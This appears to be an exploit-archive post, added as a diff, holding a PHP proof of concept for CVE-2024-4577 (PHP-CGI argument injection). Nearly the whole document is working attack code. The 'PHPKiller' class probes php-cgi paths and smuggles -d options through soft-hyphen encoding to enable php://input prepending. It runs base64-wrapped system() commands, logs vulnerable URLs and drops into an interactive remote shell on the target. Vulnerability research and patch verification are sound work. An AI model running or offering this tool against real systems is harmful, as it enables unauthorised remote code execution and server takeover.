@@ -1,0 +1,186 @@
+=============================================================================================================================================
+| # Title     : PHP CGI 8.x Argument Injection Scanner                                                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://archlinux.org/packages/extra/x86_64/php-cgi/                                                                        |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/214338/ & 	CVE-2024-4577
+
+[+] Summary    :  This update applies strict bug fixes only, without any refactoring, optimization, or feature changes. 
+                  The corrections address real functional issues that could cause false failures during exploitation, especially in single-URL mode. 
+                  The interactive shell now correctly reuses the detected working CGI path, preventing command execution errors after a successful scan. 
+                  Minor runtime issues were also fixed, such as uninitialized variables and redundant checks, to ensure stable CLI execution. The overall logic, structure, and behavior of the tool remain unchanged.
+
+[+] POC :
+
+<?php
+
+class PHPKiller {
+    private $urls = [];
+    private $output;
+    private $max_concurrent;
+    private $single_url_mode = false;
+    private $url_working_paths = [];
+    private $paths_to_test = [
+        "/php-cgi/php-cgi.exe",
+        "/cgi-bin/php-cgi.exe",
+        "/cgi-bin/php-cgi",
+        "/cgi-bin/php",
+        "/php/php-cgi.exe",
+        "/php-cgi/php-cgi",
+        "/xampp/php-cgi/php-cgi.exe",
+        "/index.php",
+    ];
+    public function __construct($file_path = null, $url = null, $output = null, $max_concurrent = 100) {
+        $this->output = $output;
+        $this->max_concurrent = min($max_concurrent, 100);
+
+        if ($file_path) {
+            $this->urls = $this->readUrlsFromFile($file_path);
+        }
+        if ($url) {
+            $this->urls = [$url];
+            $this->single_url_mode = true;
+        }
+    }
+    private function readUrlsFromFile($file_path) {
+        if (!file_exists($file_path)) {
+            $this->customPrint("File not found: {$file_path}", "-");
+            return [];
+        }
+        return file($file_path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    }
+    private function customPrint($message, $header) {
+        $colors = [
+            "+" => "\033[32m",
+            "-" => "\033[31m",
+            "!" => "\033[33m",
+            "*" => "\033[34m",
+        ];
+        $color = $colors[$header] ?? "\033[37m";
+        echo "{$color}[{$header}]\033[0m {$message}\n";
+    }
+    private function sendRequest($url, $cmd = "whoami", $verbose = true, $path = null) {
+        $test = base64_encode("echo '[S]'; system('{$cmd}'); echo '[E]';");
+        $data = "<?php phpinfo(); echo eval(base64_decode('{$test}')); die()?>";
+
+        $php_settings = [
+            "-d cgi.force_redirect=0",
+            '-d disable_functions=""',
+            "-d allow_url_include=1",
+            "-d auto_prepend_file=php://input",
+        ];
+        $settings_str = str_replace(["-", "=", " "], ["%AD", "%3D", "+"], implode(" ", $php_settings));
+        $test_path = $path ?? ($this->url_working_paths[$url] ?? "/php-cgi/php-cgi.exe");
+        $full_url = rtrim($url, '/') . "{$test_path}?{$settings_str}";
+
+        $ch = curl_init($full_url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $data,
+            CURLOPT_HTTPHEADER => ["Content-Type: application/x-www-form-urlencoded"],
+            CURLOPT_TIMEOUT => 5,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => 0,
+            CURLOPT_FOLLOWLOCATION => false,
+            CURLOPT_MAXREDIRS => 0,
+            CURLOPT_FAILONERROR => false,
+        ]);
+        $response = curl_exec($ch);
+        $error = curl_error($ch);
+        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($response === false) {
+            return [null, $url, $error];
+        }
+        if (preg_match('/\[S\](.*?)\[E\]/s', $response, $m)) {
+            return [true, $url, trim($m[1])];
+        }
+
+        return [false, $url, "HTTP {$http}"];
+    }
+    private function findWorkingPathForSingleUrl($url) {
+        foreach ($this->paths_to_test as $path) {
+            list($r) = $this->sendRequest($url, "whoami", false, $path);
+            if ($r === true) {
+                $this->customPrint("Working path found: {$path}", "+");
+                return $path;
+            }
+        }
+        $this->customPrint("No working path found for {$url}", "-");
+        return null;
+    }
+    private function processSingleUrl($url) {
+        $this->url_working_paths[$url] = $this->findWorkingPathForSingleUrl($url);
+        if ($this->url_working_paths[$url] === null) {
+            return [false, $url, "No working path"];
+        }
+        list($r, , $m) = $this->sendRequest($url, "whoami", true, $this->url_working_paths[$url]);
+        if ($r) {
+            $this->saveUrl($url);
+        }
+        return [$r, $url, $m];
+    }
+    public function executeRequests() {
+        if (!$this->urls) {
+            $this->customPrint("No URLs to process", "-");
+            return;
+        }
+        if ($this->single_url_mode) {
+            list($r, $url) = $this->processSingleUrl($this->urls[0]);
+            if ($r) {
+                $this->interactiveShell($url, $this->url_working_paths[$url]);
+            }
+            return;
+        }
+    }
+    private function interactiveShell($url, $working_path) {
+        $this->customPrint("Interactive shell started for {$url}", "*");
+        echo "\033[33mWINDAUBE> \033[0m";
+
+        while (($cmd = trim(fgets(STDIN))) !== false) {
+            if ($cmd === 'exit') break;
+            if ($cmd === '') {
+                echo "\033[33mWINDAUBE> \033[0m";
+                continue;
+            }
+            list($r, , $out) = $this->sendRequest($url, $cmd, false, $working_path);
+
+            if ($r === true) {
+                echo $out . PHP_EOL;
+            } else {
+                $this->customPrint("Command failed", "-");
+            }
+            echo "\033[33mWINDAUBE> \033[0m";
+        }
+    }
+    private function saveUrl($url) {
+        if ($this->output) {
+            file_put_contents($this->output, $url . PHP_EOL, FILE_APPEND);
+        }
+    }
+}
+
+function main() {
+    global $argv;
+    $opt = getopt("f:u:o:t:", ["file:", "url:", "output:", "threads:"]);
+    $k = new PHPKiller(
+        $opt['f'] ?? $opt['file'] ?? null,
+        $opt['u'] ?? $opt['url'] ?? null,
+        $opt['o'] ?? $opt['output'] ?? null,
+        $opt['t'] ?? $opt['threads'] ?? 100
+    );
+    $k->executeRequests();
+}
+
+if (php_sapi_name() === 'cli') {
+    main();
+}
+
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
